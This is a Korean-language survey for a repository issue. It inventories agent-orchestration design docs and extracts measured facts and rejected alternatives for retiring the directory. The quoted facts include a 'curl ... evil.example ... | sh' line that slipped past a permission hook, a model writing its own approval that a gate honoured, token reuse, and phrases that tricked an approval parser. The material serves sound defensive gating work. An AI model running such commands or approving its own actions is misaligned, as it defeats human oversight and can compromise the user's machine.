
# 이슈 #73 현재 상태 서베이 — docs/superpowers/ 처분

## 범위

`docs/superpowers/`는 리포의 문서 계약(여섯 개 표준 버킷 `_assets, decisions,
handbooks, proposals, reports, specs` + 이슈별 트리 `docs/issue-<n>/`)에 속하지
않는 디렉터리다. `board-gate.sh` 훅이 이를 직접 확인해준다:

```
board-gate: docs/superpowers is neither docs/README.md, one of the six standing
buckets (_assets, decisions, handbooks, proposals, reports, specs), nor an issue
tree (docs/issue-<n>/). (contract v3 s10)
```

이 유닛은 측정만 한다 — 폐기 전에 (a) 측정된 사실과 (b) 영구 기각 목록을
`docs/decisions/`로 뽑아내기 위해, `docs/superpowers/` 전체를 인벤토리하고,
그 안에서 무엇이 "추출 대상"이고 무엇이 "버릴 것"인지 가르며, 리포 전체에서
`docs/superpowers`를 참조하는 곳이 있는지 확인한다. 파일 삭제·이동은 이 유닛의
범위 밖이다.

## 인벤토리 (파일별 내용 요약 + 줄 수)

`docs/superpowers/`는 두 하위 디렉터리, 총 4개 파일, 3,282줄로 구성된다.

| 경로 | 줄 수 |
|---|---|
| `docs/superpowers/plans/2026-07-27-core-consent.md` | 1214 |
| `docs/superpowers/plans/2026-07-27-muster-hardening-observability.md` | 729 |
| `docs/superpowers/plans/2026-07-27-state-gate-into-core.md` | 1009 |
| `docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md` | 330 |
| **합계 (4개 파일)** | **3282** |

- **`docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md`** (330줄) —
  frontmatter `kind: design`, `status: proposed` (`docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:1-6`). muster를 Claude Code 오케스트레이터로 쓰는 아키텍처
  리뷰 겸 v2 설계 문서. `## 2. Facts verified by experiment` (측정된 사실 8건),
  `## 3. Defects found` (D1–D8, 발견된 결함), `## 4. Decisions pinned` (기각된
  대안과 그 이유 — 영구 기각 목록의 핵심), `## 5. Changes` (M1–M13/C1–C7/R1 변경
  목록), `## 6. Revised roadmap`, `## 7. What was measured vs. inferred`로
  구성된다. §6 상태 문구: `"Status, 2026-07-27 (end of day): items 1–9 are
  landed and merged."` (`docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:276`) — 즉 이 계획 대부분은 이미 실행·병합됐고 남은 것은 10번(역할별
  마이그레이션) 뿐이라고 문서 스스로 기록한다.

- **`docs/superpowers/plans/2026-07-27-core-consent.md`** (1214줄) —
  `tokenmaxxxer-core` 플러그인 저장소(동의/승인 토큰 메커니즘)를 만드는
  TDD 스타일 구현 계획. Task 1(스켈레톤) ~ Task 6(퍼블리시/설치검증)까지 6개
  태스크. 각 태스크는 실패하는 테스트 → 구현 → 통과 → 커밋의 순서로 정확한
  코드/커맨드를 포함한다. §"Why this task is a rewrite and not a fix"에 세
  가지가 기각된 mint.sh 설계와 그 실측된 우회 사례가 실려 있다
  (`docs/superpowers/plans/2026-07-27-core-consent.md:396-419`).

- **`docs/superpowers/plans/2026-07-27-muster-hardening-observability.md`**
  (729줄) — 스펙의 M1–M6(자가 mint 구멍 차단, 조용한 Write 거부 수정, 실행
  결과 원장 기록, repo-config 거부 확장, 사전승인된 cp 제거, 훅 발화
  카나리) 항목을 muster 쪽에서 구현하는 TDD 계획. `spawn.py`에 `spawn_cmd`,
  `board_snapshot`, `classify`, `ledger_write`, `doctor`/`require_doctor` 를
  추가하는 6개 태스크. 새로운 측정치보다는 스펙 §2의 실측 사실을 커밋
  메시지·주석에서 재인용하는 성격이 강하다.

- **`docs/superpowers/plans/2026-07-27-state-gate-into-core.md`** (1009줄) —
  7개 룰북에 흩어진 `state-gate.sh` 사본을 `tokenmaxxxer-core`의 파라미터화된
  라이브러리 `state_gate.py`로 옮기는 계획. 서두에 7개 사본의 줄 수·해시를
  실측한 표가 있고(아래 인용), `ops`를 기준 구현으로, `review`를 교차검증으로
  선택한 이유가 실측 근거로 제시된다. 마지막 절 `## What this plan
  deliberately does not do`에 범위 밖으로 명시적으로 남겨둔 항목들이 있다.

## 추출 대상 1 — 폐기 전 측정 사실

아래는 "measured"/"실측" 표시가 붙은, 재사용 가치가 있는 구체적 관측이다.
모두 `path:line`과 원문을 병기한다.

1. **7개 `state-gate.sh` 사본의 실제 분기량** —
   `docs/superpowers/plans/2026-07-27-state-gate-into-core.md:15-26`:
   > "Measured 2026-07-27, after substituting the role name and stripping comments and blank lines:
   >
   > | role | total | substantive | role-substituted hash |
   > |---|---|---|---|
   > | product | 802 | 547 | e7adb510 |
   > | reflect | 798 | 540 | b99eb0bb |
   > | ux-design | 797 | 542 | be69d68a |
   > | verify | 796 | 515 | 4cdae9ba |
   > | review | 794 | 524 | db6905a6 |
   > | ops | 604 | 434 | 8f818afc |
   > | feasibility | 553 | 371 | 39343875 |
   >
   > Seven distinct hashes. The two *closest* — review and reflect, a mirrored pair — still differ on 702 substantive lines, including `set -euo pipefail` versus `set -uo pipefail` and kill switches named `REVIEW_CYCLE_DISABLE` versus `REFLECT_CYCLE_OFF`."

2. **어느 사본이 더 안전했는가** —
   `docs/superpowers/plans/2026-07-27-state-gate-into-core.md:624`:
   > "`ops` goes first because the 2026-07-27 proposal recorded it as the only one that refuses a Bash write it cannot parse, where review's allowed it."

3. **헤드리스 세션에서 훅이 실제로 발화하는지 — 문서에 없고 실측만 있음** —
   `docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:41-44`:
   > "headless hook firing is **measured, not documented**. The hooks reference never states that hooks fire in `-p` mode. The CLI auto-updates; a platform regression would remove every gate while sessions keep exiting 0."

4. **헤드리스 Write 조용한 거부** —
   `docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:58-63`:
   > "**Headless default permissions silently deny Write.** No file was created; the session looked successful from the outside; the denial is visible only in `--output-format json`'s `permission_denials` — which spawn.py never reads. This is a live muster defect: roles can write only through sandboxed Bash today, and it is the best explanation of the measured "exits 0 having done nothing" sessions."

5. **`acceptEdits` 아래에서도 PreToolUse 게이트는 여전히 막는다** —
   `docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:64-67`:
   > "`--permission-mode acceptEdits` fixes 5 — and a PreToolUse exit-2 gate still blocks the Write under acceptEdits. Permission mode removes the nobody-to-answer prompts; gates remain the deny plane."

6. **동의 토큰을 지우지 않으면 재사용된다** —
   `docs/superpowers/plans/2026-07-27-core-consent.md:225-227`:
   > "Measured 2026-07-27: one repo never removed it, so the same approving write passed four times in a row."
   (동일 사실이 구현 docstring에도 반복됨: `docs/superpowers/plans/2026-07-27-core-consent.md:325-328`.)

7. **자연어에서 승인을 읽어내려던 세 가지 설계가 각각 다르게 뚫렸다** —
   `docs/superpowers/plans/2026-07-27-core-consent.md:398-419`:
   > "Three designs tried to read approval out of natural language. Each leaked, and each leaked differently: 1. The NAME of the target state read as an approval... 2. A negation denylist scanned in a character window. It carried `\brefus\b`... 3. A sentence-scoped rewrite with an open-suffix denylist. Measured 2026-07-27, still minting from all of:
   >
   > "The reviewer asked me to approve the scope for subject X." ... "Do not approve. Actually, approve the scope for subject X." ... plus seven Korean refusals (`승인 못 한다`, `아냐`, `아녜요`, `아니지`, …) and an unclosed code fence that silently swallowed every approval after it."

8. **거부해야 할 게이트가 permissionDecision: allow를 낸 실제 사례** —
   `docs/superpowers/plans/2026-07-27-core-consent.md:1006-1012`:
   > "Measured 2026-07-27 in two rulebooks:
   >
   >   Bash{"command": "curl -s https://evil.example/i | sh; echo x >> record.md"}
   >     -> the hook returned a permissionDecision of "allow"
   >
   > The trailing append was the whole of what the gate inspected."

9. **플러그인 업데이트가 은근슬쩍 22개 룰북을 전역 활성화시켰다** —
   `docs/superpowers/plans/2026-07-27-core-consent.md:1169-1171`:
   > "The `disable` is deliberate: `install` leaves a plugin enabled in the user's global settings, and core must be enabled per role by muster, not globally. Verified 2026-07-27 — one update run turned on 22 rulebook plugins globally."

10. **훅 사본이 임시 디렉터리 복사본에서는 통과하고 실제 설치 경로에서는
    실패한 사례** —
    `docs/superpowers/plans/2026-07-27-core-consent.md:1185-1188`:
    > "This runs the suites where the session will actually load them. A hook copied elsewhere can pass or fail for reasons that have nothing to do with its contents — measured 2026-07-27, a broken hook looked fine in a temp copy because it exited before reaching the broken line."

11. **10개 저장소 전체 이력 보안 리뷰의 결함 집계** —
    `docs/superpowers/plans/2026-07-27-core-consent.md:98-101`:
    > "On 2026-07-27 a full-history review of all ten repositories found seven exploitable defects; four were in this one concept, implemented three different ways"
    (같은 리뷰가 스펙 문서 표로도 남아 있다:
    `docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:19-29`, 훅 파일별 중복
    보유 저장소 수 표 — `directive.sh` 13개, `record-fields-gate.sh` 9개 등.)

12. **환경변수로 unattended 모드를 몰래 켤 수 없음 / repo 자체 settings.json은
    스폰에서 거부됨 — 둘 다 실측** —
    `docs/superpowers/plans/2026-07-27-core-consent.md:794-801`:
    > "Both halves of that were measured on 2026-07-27 and must not regress: An agent's `export TOKENMAXXXER_UNATTENDED=1` inside a `Bash` call does not reach the hook's environment — the hook continued to read the settings value. A repository shipping its own `.claude/settings.json` is refused at spawn by `spawn.py`'s `require_no_repo_config` (muster, commit `5769b7a`)."

13. **§7 종합 — 무엇이 측정이고 무엇이 추론인지 스스로 구분** —
    `docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:322-330`:
    > "Everything in §2 and every D-item: measured on this machine, this CLI version, cited to file:line or reproduced live during this review. ... Known residual inference: `--plugin-dir` has been proven with a probe plugin, not yet with a full nine-plugin rulebook (M10 is gated on exactly that canary); headless hook firing remains undocumented upstream (M6 exists because of it)."

## 추출 대상 2 — 영구 기각 목록

가장 명시적인 목록은 스펙 문서 `## 4. Decisions pinned (alternatives rejected
with reasons)`이다 (`docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:122-176`).
그 외에 `core-consent.md`와 `state-gate-into-core.md`에도 개별 기각 사례가
흩어져 있다. 전부 모으면:

1. **오케스트레이션 대안 4종 기각** (표) —
   `docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:26-32`:
   > "| alternative | fails because |\n|---|---|\n| Agent SDK driver | does not auto-enforce plugin hooks... |\n| one session + native subagents per role | plugin scoping is session-level; a subagent cannot carry a different plugin set |\n| agent teams | experimental, opt-in env var; no per-teammate plugin scoping; no session resumption |\n| `--bare` isolation | never reads OAuth/keychain — requires ANTHROPIC_API_KEY... |\n| MCP board server | rejected permanently (§4 below) |"

2. **die-and-respawn만이 유일한 게이트 통과 메커니즘으로 고정** —
   `docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:124-130`:
   > "**Die-and-respawn stays the only gate-crossing mechanism.** A human gate is not a paused conversation; it is a durable board-state transition awaiting an out-of-band single-use token that survives session death by construction."

3. **stream-json keep-alive를 승인 채널로 쓰는 안 기각** —
   `docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:132-137`:
   > "**stream-json keep-alive is rejected as an approval channel.** Every injected "user turn" is authored by whichever process holds stdin. ... Mechanically indistinguishable from the human's own turn, it dissolves the exact trust premise the challenge line exists to enforce. (Verified to *work*; rejected on trust, not capability.)"

4. **`--resume`를 지금 역할 세션에 채택하지 않음** —
   `docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:139-144`:
   > "**`--resume` is not adopted for role sessions now.** If ever: only after JSON capture exists (needs session_id), only with settings/plugin flags re-passed (documented as not restored...), only from the same project directory, and only with the token already minted out-of-band. Recorded here so it is not relitigated."

5. **MCP 보드 서버 영구 기각** —
   `docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:146-153`:
   > "**The MCP board server is rejected permanently.** MCP tool use is voluntary — a session holding Write/Edit/Bash bypasses any board server, so the PreToolUse deny plane must exist regardless; the server would add a component and remove none. ... the contract's git-native properties ... would be lost or reimplemented."

6. **드라이버는 결정론적 muster 코드여야 함 — 모델도, 클라우드도 아님** —
   `docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:155-158`:
   > "**The driver is deterministic muster code, not a model and not the cloud.** Not the orchestrate plugin (an LLM must not be the scheduler); not cron/Routines (Anthropic-cloud execution cannot reach keychain auth or the local Seatbelt sandbox)."

7. **참석형 승인 채널은 기계적이어야 하며, 중계는 금지** —
   `docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:160-166`:
   > "**The attended approval channel is mechanical, and relays are forbidden.** Two first-class paths only: (a) the human types the challenge line in their own interactive session... (b) `spawn.py approve <kind> <subject>`, which requires stdin `isatty()`... The orchestrator's job is to *print* the exact line, never to relay it."

8. **로드맵이 명시적으로 삭제한다고 선언한 것들** —
   `docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:316-320`:
   > "What this roadmap deletes outright: the stream-json approval channel (never planned, now explicitly rejected), the MCP board server (idea permanently closed), `--bare`/CLAUDE_CONFIG_DIR isolation (re-confirmed dead), and — once M10 survives a canary cycle — the warm-up spawns, install verification, ghost-entry detection, and most of the update dance."

9. **자연어 파싱 기반 승인 판정 설계 3종 기각** (mint.sh) —
   `docs/superpowers/plans/2026-07-27-core-consent.md:398-423`:
   > "Three designs tried to read approval out of natural language. Each leaked... Deciding what a sentence MEANS is a language problem; a regex is the wrong tool and no amount of denylist grows into the right one. Deciding whether two strings are EQUAL is not a language problem."
   (세부 근거는 위 "추출 대상 1"의 7번 항목과 동일 인용.)

10. **모델 자신의 판단으로 게이트를 대체하는 안 기각** —
    `docs/superpowers/plans/2026-07-27-core-consent.md:432-438`:
    > "The hook must stay a hook rather than becoming the model's own judgment for two reasons. The model is the thing being gated, and an entity cannot authorize itself — that is exactly the `warrant/hooks/scope-gate.sh` defect measured on 2026-07-27, where the model wrote its own `status: approved` proposal and the gate honored it. ... an LLM reading adversarial text to decide authorization is injectable, while string equality is not."

11. **review/verify 역할 통합 기각** —
    `docs/superpowers/plans/2026-07-27-state-gate-into-core.md:13`:
    > "**This is not a role merge.** Contract §16 is titled "verify/review division of labor" and says the mechanism "does not merge the two roles' verdicts"; §4 makes their independence a rule. ... **Skills do not move. Roles do not merge. Only the machine moves.**"
    같은 결론이 계획 말미에도 반복: `docs/superpowers/plans/2026-07-27-state-gate-into-core.md:996`.

12. **기계적 `sed` 일괄 마이그레이션 기각** —
    `docs/superpowers/plans/2026-07-27-state-gate-into-core.md:27`:
    > "A mechanical `sed` migration is not available. This plan therefore does not attempt one: it builds the library against **one reference implementation**, then proves it on a **second, differently-shaped one**, and only then touches the other five."

## 버릴 것 (추출 후 잔여)

측정 사실과 영구 기각 목록을 뽑아낸 뒤, `docs/superpowers/` 안의 나머지는 전부
실행형 TDD 구현 계획(체크박스, 실패하는 테스트 코드, `git commit` 문구,
`role.json`/`state_gate.py`/`consent.py`/`mint.sh`/`judge.py`의 구체적 소스
전문)이다. 이들은:

- 대상 저장소가 이 리포(muster)가 아니라 `tokenmaxxxer-core`, `ops-agent-rulebook`,
  `review-agent-rulebook` 등 **다른 저장소들**이다 — 이 리포에는 적용할 수 없는
  구현 지시문이다.
- 스펙 자신이 §6에서 "items 1–9 are landed and merged"라고 기록한다
  (`docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md:276`) — 즉 core-consent.md와
  muster-hardening-observability.md가 다루는 M1–M6 항목은 이미 다른 곳에서
  실행 완료된 것으로 문서 자신이 증언한다. 코드 전문을 보존할 이유가 없다.
- 남은 항목(10번, 역할별 마이그레이션)도 "이 저장소"가 아니라 9개 룰북
  저장소 각각에서 수행되는 작업이라 이 리포의 코드베이스와 무관하다.

**결론: `docs/superpowers/` 전체가 버려진다.** 디렉터리 자체가 살아남을
이유는 없다 — 위 "추출 대상 1·2"의 인용문만 `docs/decisions/`로 옮기면
디렉터리 안의 어떤 파일도 원형 그대로 남겨둘 필요가 없다. (실제 삭제 실행은
이 유닛의 범위 밖 — 아래 write set은 "예상"이다.)

## 변경 대상 write set (예상)

**새로 만들 파일 (docs/decisions/, 명명 규칙은 아래 미확정 참고):**

- `docs/decisions/2026-07-27-orchestrator-v2-rejected-alternatives.md` —
  "추출 대상 2"의 §4 "Decisions pinned" 전체(오케스트레이션 계층의 영구 기각
  목록: MCP 보드 서버, stream-json 승인 채널, `--resume` 즉시 채택, 대안
  드라이버 4종, review/verify 역할 통합, 기계적 sed 마이그레이션, 자연어
  파싱 기반 mint.sh 설계 3종, 모델 자기판단 게이트).
- `docs/decisions/2026-07-27-orchestrator-v2-measured-facts.md` —
  "추출 대상 1"의 측정 사실 전체(헤드리스 훅 발화, Write 조용한 거부,
  7-copy state-gate 분기량, 토큰 재사용 결함, permissionDecision:allow 사례,
  22개 플러그인 전역 활성화, 임시 디렉터리 vs 실치 경로 차이 등), path:line
  인용과 함께.
  (두 파일로 나누는 대신 하나의 `docs/decisions/2026-07-27-superpowers-retirement.md`에
  "측정된 사실" / "영구 기각 목록" 두 섹션으로 합쳐도 무방 — 아래 미확정
  참고.)

**지울 경로 (docs/superpowers/ 전체, 추출 후):**

- `docs/superpowers/plans/2026-07-27-core-consent.md`
- `docs/superpowers/plans/2026-07-27-muster-hardening-observability.md`
- `docs/superpowers/plans/2026-07-27-state-gate-into-core.md`
- `docs/superpowers/specs/2026-07-27-orchestrator-v2-design.md`
- `docs/superpowers/plans/` (빈 디렉터리)
- `docs/superpowers/specs/` (빈 디렉터리)
- `docs/superpowers/` (빈 디렉터리)

**살아남아야 할 것: 없음.** 아래 "미확정" 항목 하나(§4 결정 목록과 §2 측정
사실을 파일 하나로 합칠지 둘로 나눌지)를 제외하면, 디렉터리 전체가 그대로
지워져도 되는 삭제 대상이라는 결론이다.

**인바운드 참조 (아래 6번 항목 참고) — 삭제 시 끊어질 링크는 없음.**
`docs/superpowers/` 바깥에서 그 경로를 참조하는 곳이 리포 전체에 없으므로
write set에 추가할 "링크 수정" 항목은 없다.

## 미확정/판단 필요

1. **`docs/decisions/`가 리포에 아직 존재하지 않는다.** 최상위에도
   (`docs/` 아래 실제 존재하는 디렉터리는 `proposals`, `reports`, `specs`,
   그리고 이슈 트리들뿐이다 — `_assets`, `decisions`, `handbooks`는 계약이
   버킷으로 지정만 해뒀을 뿐 아직 한 번도 파일이 생긴 적이 없다), 어떤
   `docs/issue-<n>/decisions/`에도 없다. 확인한 이슈 트리
   (`issue-31,34,35,38,40,43,44,46,51,54,58,60,64,65`) 전부 `proposals`와
   `reports`만 갖고 있고(`issue-65`는 `reports`만), `decisions`를 가진 것은
   하나도 없다. **즉 "기존 명명 규칙"이라 부를 만한 `decisions/` 전례가
   이 리포에 없다** — 이 서베이는 5번 과제("기존 규칙을 배워서 그대로
   따른다")를 문자 그대로 수행할 수 없었고, 대신 형제 버킷인
   `docs/proposals/`·`docs/reports/`의 관측된 컨벤션(파일명
   `YYYY-MM-DD-<slug>.md`, YAML frontmatter, 영어 산문, 표 기반 근거)을
   최선의 유추로 제안했다. 사람의 확정이 필요하다.
2. **frontmatter 필드 형태.** `docs/proposals/`는
   `kind: proposal / status: proposed|landed / date: / files:` 를 쓰고,
   `docs/reports/`는 `proposal: <path>` 단일 필드로 원본을 역참조한다.
   `decisions/`가 "제안이 이렇게 결론났다"를 기록하는 성격이라면 proposal
   쪽 형태(`kind: decision`)에 가깝겠지만, 이 역시 실존하는 전례가 없어
   확정할 수 없다.
3. **파일을 하나로 합칠지 둘로 나눌지.** "측정된 사실"과 "영구 기각 목록"을
   위 write set처럼 파일 2개로 나눌지, 하나의
   `2026-07-27-superpowers-retirement.md`에 두 섹션으로 넣을지는 이슈 #73
   본문이 "(a)…(b)…" 두 가지를 나란히 언급할 뿐 파일 분리를 지시하지 않아
   판단이 필요하다.
4. **`superpowers:subagent-driven-development` / `superpowers:executing-plans`
   참조는 이 디렉터리에 대한 링크가 아니다.** grep으로 잡힌 4건 중 3건은
   `docs/superpowers/plans/*.md:3`의
   "REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development ... or
   superpowers:executing-plans" 문구인데, 이는 (지금 이 세션에서도 스킬
   목록에 있는) **동명의 외부 Claude Code 플러그인/스킬 패키지("superpowers")**를
   가리키는 것으로 보이며, 리포 내부 `docs/superpowers/` 디렉터리를 가리키는
   경로 참조가 아니다. 우연한 이름 충돌로 보이지만, 확실히 하려면 사람의
   확인이 필요하다 — 삭제 대상 write set에는 영향 없음(어차피 세 줄 다
   삭제될 파일 안에 있다).

